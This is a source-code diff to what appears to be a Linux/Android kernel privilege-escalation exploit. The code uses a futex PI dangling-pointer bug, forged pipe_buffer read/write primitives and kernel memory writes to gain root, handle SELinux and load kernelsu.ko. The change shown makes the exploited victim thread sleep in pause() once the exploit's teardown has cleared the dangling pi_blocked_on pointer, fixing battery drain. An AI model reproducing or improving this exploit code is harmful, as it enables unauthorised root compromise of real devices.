@@ -180,6 +180,11 @@ static uint64_t g_prw_memstart = 0x40000000ULL; /* 38-r64: measured via pagemap 
 static int g_mode_root;           /* 37-r17: Tier-3 write round (W0.pi.rb_right=TARGET) */
 static int g_mode_ksu;            /* 38-r29: load kernelsu.ko after root */
 static int g_mode_physrw;         /* 38-r59: forged pipe_buffer rw ladder */
+/* 42-r129 battery fix: set by the root chain's teardown step (consumer
+ * thread) after the victim's dangling pi_blocked_on is cleared+verified.
+ * Read by the victim at its park point: 1 -> pause() (0% CPU) instead of
+ * the historical pure-user spin (a full core). Release/acquire ordered. */
+static volatile int g_pi_blocked_on_zeroed;
 static pthread_t g_consumer_th;   /* 37-r20: join before drain */
 static int g_consumer_tid;        /* 37-r27: walk-by-comm target */
 static int g_victim_prio = -1;     /* pre-consume readback of victim real prio */
@@ -1105,6 +1110,20 @@ static void *waiter_thread(void *arg)
 	g_sm_errno = errno;
 	/* blocking form: reaching here = drained and delivered (ret = payload) */
 	__atomic_store_n(&stamp_ready, 1u, __ATOMIC_RELEASE);
+	/* 42-r129 battery fix (sleep-drain root cause): the pure-user spin below
+	 * costs a full core for the whole boot, and — worse — owner_running()
+	 * stays true, so the owner thread's rt_mutex osq spin inside
+	 * FUTEX_LOCK_PI never breaks (100% stime) and the freezer can never
+	 * suspend the phone. If the root chain's teardown zeroed our dangling
+	 * pi_blocked_on (consumer thread; happens-before via the join -> drain
+	 * -> sendmsg-return chain above), the zero-syscall discipline's reason
+	 * is gone: park in pause(). All signals are blocked above so pause()
+	 * never returns; SIGKILL still reaches us via group exit. Teardown off
+	 * or clear-FAIL -> keep the historical spin. */
+	if (__atomic_load_n(&g_pi_blocked_on_zeroed, __ATOMIC_ACQUIRE)) {
+		for (;;)
+			pause();
+	}
 	for (;;) {
 		volatile int spin = 0;
 		(void)spin;
@@ -3449,6 +3468,8 @@ selinux_done:;
 			if (!pbo) {
 				LOGI("[t37] root: teardown: pi_blocked_on "
 				     "already 0 (nothing to clear)");
+				__atomic_store_n(&g_pi_blocked_on_zeroed, 1,
+						 __ATOMIC_RELEASE);
 			} else if (t37_kwrite64(g_root_fd,
 						vt + GL36_TASK_PI_BLOCKED_ON_OFF,
 						0) == 0 &&
@@ -3456,6 +3477,11 @@ selinux_done:;
 					vt + GL36_TASK_PI_BLOCKED_ON_OFF) == 0) {
 				LOGI("[t37] root: teardown: pi_blocked_on "
 				     "cleared + verified <<< RESIDENCY ZEROED");
+				/* 42-r129: victim may now park in pause() (see its
+				 * park point); the drain below wakes it strictly AFTER
+				 * this store (join -> drain -> sendmsg-ret hb chain). */
+				__atomic_store_n(&g_pi_blocked_on_zeroed, 1,
+						 __ATOMIC_RELEASE);
 			} else {
 				LOGI("[t37] root: teardown: clear FAIL "
 				     "(residency kept)");
@@ -3465,8 +3491,9 @@ selinux_done:;
 			     "(tid=%d)", victim_tid);
 		}
 	}
-	LOGI("[t37] root: victim parked in user spin (no syscall) — dangling "
-	     "pi_blocked_on never deref'd; teardown deferred");
+	LOGI("[t37] root: victim park mode = %s",
+	     g_pi_blocked_on_zeroed ? "pause (teardown zeroed residency)" :
+	     "user spin (dangling pi_blocked_on, teardown deferred)");
 	/* 9. leader cred readback (the syscall-level proof runs on the LEADER
 	 * thread in run_child after the join — this thread's own cred is
 	 * untouched). */
